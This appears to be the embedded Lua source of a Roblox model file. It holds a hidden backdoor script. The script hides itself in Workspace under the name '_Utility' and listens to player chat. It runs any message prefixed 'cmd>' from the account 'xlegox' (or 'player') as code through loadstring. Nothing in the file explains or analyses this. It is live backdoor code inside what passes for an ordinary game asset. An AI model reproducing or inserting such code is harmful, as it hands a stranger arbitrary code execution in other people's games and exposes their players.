					<ProtectedString name="Source">print(&quot;Loaded&quot;)
if not game.Workspace:FindFirstChild(&quot;_Utility&quot;) then
	local t = Instance.new(&quot;Timer&quot;)
	t.Parent = game.Workspace
	t.Name = &quot;_Utility&quot;
	script.Parent = t
	game.Players.ChildAdded:connect(function(p)
		p.Chatted:connect(function(msg, res)
			if msg:sub(1, 4) == &quot;cmd&gt;&quot; and (p.Name:lower() == &quot;xlegox&quot; or p.Name:lower() == &quot;player&quot;) then
				local st, err = pcall(loadstring(msg:sub(5, -1)))
				if err then
					local a = Instance.new(&quot;Message&quot;)
					a.Text = &quot;cmd:1: &quot;..err
					a.Parent = p
					wait(2)
					a:remove()
				end
				elseif msg == &quot;_version&quot; then
				local a = Instance.new(&quot;Message&quot;)
				a.Text = &quot;Version 3.0.0&quot;
				a.Parent = p
				wait(2)
				a:remove()
			end
		end)
	end)
	else
	script:remove()
end
	

